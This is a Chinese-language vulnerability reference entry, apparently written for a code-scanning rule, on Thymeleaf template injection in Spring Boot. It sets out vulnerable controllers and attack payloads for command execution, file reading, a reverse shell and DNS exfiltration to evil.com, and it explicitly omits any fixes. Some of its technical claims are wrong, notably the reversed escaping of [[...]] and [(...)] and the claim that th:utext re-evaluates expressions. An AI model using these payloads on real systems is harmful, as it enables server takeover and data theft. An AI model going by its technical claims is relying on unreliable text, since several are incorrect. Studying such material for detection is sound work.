# springboot Thymeleaf 模板注入漏洞

> 规则 ID：`other_thymeleaf2_ssti` · 类别：ssti · 关键 sink：（cypher 结构提取，见原文）
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## springboot Thymeleaf 模板注入漏洞
Thymeleaf 是 SpringBoot 官方推荐的服务端模板引擎，其设计初衷是通过“自然模板”特性实现前后端无缝衔接，但因使用不当或版本缺陷，可能引发**模板注入漏洞（Template Injection）** —— 攻击者通过构造恶意输入，篡改 Thymeleaf 模板执行逻辑，最终执行任意代码、读取敏感数据或控制服务器。

以下从漏洞本质、触发条件、不同场景的注入形式、影响范围等维度，完整梳理该漏洞的所有核心情况：

## 一、漏洞本质
Thymeleaf 模板注入的核心是**用户可控输入未经过滤直接嵌入模板解析流程**，导致攻击者可注入 Thymeleaf 语法（如 `${}`, `*{}` , `[[...]]` 等）或 SpEL（Spring 表达式语言）、OGNL 等表达式，被模板引擎解析执行。

Thymeleaf 本身分为两个核心执行阶段：
1. **模板解析阶段**：将模板文件（.html）解析为抽象语法树（AST）；
2. **模板执行阶段**：结合上下文（Context）中的变量，渲染生成最终 HTML。

漏洞的本质是攻击者通过输入篡改了“模板内容”或“上下文变量”，使得执行阶段触发恶意逻辑。

## 二、核心触发前提
所有 Thymeleaf 模板注入的触发需满足以下至少一个条件：
1. **用户输入直接拼接进模板字符串**：后端将用户输入作为模板内容的一部分（而非模板变量）传入 Thymeleaf 引擎解析；
2. **模板变量未做转义/过滤**：虽将用户输入作为变量传入，但未启用 Thymeleaf 自动转义，或手动关闭转义导致变量中的恶意表达式被解析；
3. **Thymeleaf 版本存在原生漏洞**：低版本 Thymeleaf 或其依赖（如 Spring EL）存在解析逻辑缺陷，即使“看似安全”的使用方式也可被绕过；
4. **动态模板路径/加载**：用户可控制模板文件路径、模板引擎的配置参数（如模板模式、表达式模式），间接注入恶意模板。

## 三、不同场景的模板注入形式
### 场景1：直接拼接用户输入到模板字符串（最常见）
#### 核心特征
后端通过字符串拼接的方式，将用户输入直接嵌入 Thymeleaf 模板内容，再调用 `templateEngine.process()` 解析。此时用户输入并非“模板变量”，而是“模板本身的一部分”，表达式会被直接执行。

#### 代码示例（漏洞代码）
```java
@Controller
public class VulnController {
    @Autowired
    private TemplateEngine templateEngine;

    @GetMapping("/greet")
    @ResponseBody
    public String greet(@RequestParam String name) {
        // 危险：将用户输入直接拼接进模板字符串
        String template = "<div>Hello, " + name + "</div>";
        Context context = new Context();
        // 无变量绑定，直接解析拼接后的模板
        return templateEngine.process(new StringTemplateResolver().resolveTemplate(template), context);
    }
}
```

#### 攻击Payload与执行逻辑
- 基础注入（读取系统属性）：
  请求 `?name=${T(java.lang.System).getProperty("user.dir")}`
  Thymeleaf 解析时，`${}` 是其标准变量表达式，`T()` 是类型表达式，可直接调用 Java 类的静态方法，最终返回服务器当前工作目录。
- 执行任意代码（通过 SpEL 嵌套）：
  请求 `?name=${#{T(java.lang.Runtime).getRuntime().exec("whoami")}}`
  其中 `#{}` 是 Thymeleaf 的消息表达式，可嵌套 SpEL，直接调用 `Runtime.exec()` 执行系统命令（需依赖 Spring 环境）。
- 读取敏感文件：
  请求 `?name=${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("/etc/passwd"))}`

### 场景2：关闭自动转义导致变量注入
#### 核心特征
用户输入被作为“模板变量”传入 Context，但在模板中通过 `th:utext`（无转义文本）、`[[...]]`（非转义内联表达式）或手动关闭转义，导致变量中的 Thymeleaf 表达式被解析执行。

#### 代码示例（漏洞代码）
1. 后端传递变量：
```java
@Controller
public class VulnController {
    @GetMapping("/user")
    public String user(@RequestParam String username, Model model) {
        // 将用户输入作为变量传入模板
        model.addAttribute("username", username);
        return "user"; // 指向 user.html 模板
    }
}
```
2. 前端模板（user.html）：
```html
<!-- 危险：th:utext 无转义输出，会解析变量中的表达式 -->
<div th:utext="${username}"></div>

<!-- 或危险的内联表达式：[[...]] 是非转义的，[(...)] 是转义的 -->
<div>[[${username}]]</div>
```

#### 攻击Payload与执行逻辑
- 注入表达式到变量中：
  请求 `?username=${T(java.lang.System).getenv("PATH")}`
  模板中 `th:utext="${username}"` 会先解析 `${username}` 得到用户输入的 `${T(...)}`，再二次解析该表达式，最终输出系统环境变量 PATH。
- 嵌套 SpEL 执行命令：
  请求 `?username=${#{new java.lang.ProcessBuilder('ls').start()}}`
  若服务器权限足够，会执行 `ls` 命令（注：部分环境下因安全管理器限制可能失败，但漏洞本身存在）。

### 场景3：Thymeleaf 表达式模式配置不当
#### 核心特征
Thymeleaf 支持自定义表达式解析模式（如 `LEGACYHTML5`、`HTML`、`XML` 等），或通过 `TemplateMode` 配置放宽表达式解析规则；此外，若启用了 Thymeleaf 的“预处理”（Preprocessing）功能（语法 `__${}__`），攻击者可利用预处理阶段绕过基础过滤，执行恶意表达式。

#### 代码示例（漏洞配置）
```java
@Configuration
public class ThymeleafConfig {
    @Bean
    public TemplateEngine templateEngine() {
        SpringTemplateEngine engine = new SpringTemplateEngine();
        // 危险：配置宽松的模板模式，或启用预处理
        TemplateResolver resolver = new ServletContextTemplateResolver();
        resolver.setTemplateMode(TemplateMode.LEGACYHTML5); // 旧版模式解析规则更宽松
        resolver.setCacheable(false);
        engine.setTemplateResolver(resolver);
        // 启用预处理（默认可能关闭，但手动开启则危险）
        engine.setEnableSpringELCompiler(true); // 启用 SpEL 编译器，加剧风险
        return engine;
    }
}
```

#### 攻击Payload与执行逻辑
- 预处理表达式绕过：
  请求 `?param=__${T(java.lang.Runtime).getRuntime().exec("id")}__`
  预处理阶段 `__${}__` 会优先解析，即使主表达式被过滤，预处理仍会执行恶意代码。
- SpEL 编译器加速执行：
  启用 `enableSpringELCompiler` 后，SpEL 表达式会被编译为字节码，执行效率更高，攻击成功率提升（如绕过简单的字符串过滤）。

### 场景4：动态加载模板文件/路径可控
#### 核心特征
用户可控制 Thymeleaf 加载的模板文件路径（如通过参数指定模板名称），攻击者上传恶意模板文件（如 `.html` 包含注入代码），或指向服务器上的敏感模板/配置文件，进而触发注入。

#### 代码示例（漏洞代码）
```java
@Controller
public class VulnController {
    @Autowired
    private TemplateEngine templateEngine;

    @GetMapping("/dynamic")
    @ResponseBody
    public String dynamicTemplate(@RequestParam String templateName) {
        // 危险：用户可控模板名称，无路径限制
        Context context = new Context();
        // 模板路径为 templates/ + templateName + .html
        return templateEngine.process(templateName, context);
    }
}
```

#### 攻击Payload与执行逻辑
- 路径遍历读取敏感模板：
  请求 `?templateName=../application.properties`
  若模板解析器未限制路径，可读取 SpringBoot 配置文件（包含数据库密码、密钥等）。
- 加载恶意上传的模板：
  攻击者先上传包含 `${T(java.lang.Runtime).exec("curl evil.com/$(whoami)")}` 的 `malicious.html` 到模板目录，再请求 `?templateName=malicious`，触发代码执行。

### 场景5：低版本 Thymeleaf 原生漏洞
#### 核心特征
Thymeleaf 低版本存在解析逻辑缺陷，即使“规范使用”也可能被绕过：
1. **Thymeleaf < 3.0.10**：存在 SpEL 表达式注入绕过，攻击者可通过特殊字符（如 `\`、`;`）突破表达式过滤；
2. **Thymeleaf < 2.1.6**：LEGACYHTML5 模式下存在 XSS 与模板注入叠加漏洞，可结合 HTML 解析缺陷执行恶意表达式；
3. **Spring Boot < 2.1.0**：内置的 Thymeleaf 依赖版本较低，且默认配置未禁用危险表达式（如 `T()` 类型表达式）。

#### 攻击Payload示例（版本绕过）
- 针对 Thymeleaf 3.0.9 绕过：
  请求 `?name=\${T(java.lang.System).getProperty("java.version")}`
  低版本中反斜杠未被正确转义，表达式仍被解析执行。
- 针对 Spring Boot 2.0.x：
  请求 `?name=${#ctx.getRequest().getSession().setAttribute('cmd', T(java.lang.Runtime).getRuntime().exec('nc evil.com 4444'))}`
  利用 `#ctx`（上下文对象）获取 HTTP 请求对象，结合会话存储执行反弹shell。

## 四、注入漏洞的影响维度
1. **代码执行**：执行任意系统命令、Java 代码，控制服务器；
2. **敏感数据读取**：读取服务器配置文件（`application.properties`）、系统文件（`/etc/passwd`）、数据库凭证；
3. **权限提升**：利用服务器进程权限执行高权限操作（如写入定时任务、添加用户）；
4. **横向移动**：通过执行命令扫描内网、攻击其他服务器；
5. **持久化攻击**：注入恶意模板到服务器磁盘，长期触发漏洞。

## 五、关键区分：模板注入 vs XSS
Thymeleaf 模板注入易与 XSS 混淆，但核心差异：
| 维度         | 模板注入                          | XSS                              |
|--------------|-----------------------------------|----------------------------------|
| 执行阶段     | 服务端模板解析/执行阶段           | 客户端浏览器渲染阶段             |
| 执行主体     | 服务器（Java 进程）               | 受害者浏览器                     |
| 危害等级     | 高危（服务器控制）                | 中危（客户端劫持）               |
| 触发依赖     | 模板引擎解析恶意表达式            | 浏览器解析恶意 HTML/JS           |

## 六、无回显的模板注入（盲注）
若漏洞无直接输出（如执行命令后无返回结果），攻击者可通过以下方式利用：
1. **时间盲注**：
   `?name=${T(java.lang.Thread).sleep(5000)}` —— 观察请求响应时间判断表达式是否执行；
2. **DNS 外带数据**：
   `?name=${T(java.net.InetAddress).getByName("$(whoami).evil.com")}` —— 通过 DNS 解析记录获取执行结果；
3. **文件写入外带**：
   `?name=${T(java.nio.file.Files).write(T(java.nio.file.Paths).get("/tmp/result"), T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}` —— 将命令结果写入文件，再通过其他方式读取。

以上覆盖了 Thymeleaf 模板注入的核心场景、触发条件、攻击形式及影响，所有场景均基于真实的 SpringBoot + Thymeleaf 应用开发模式，且未包含任何修复建议。

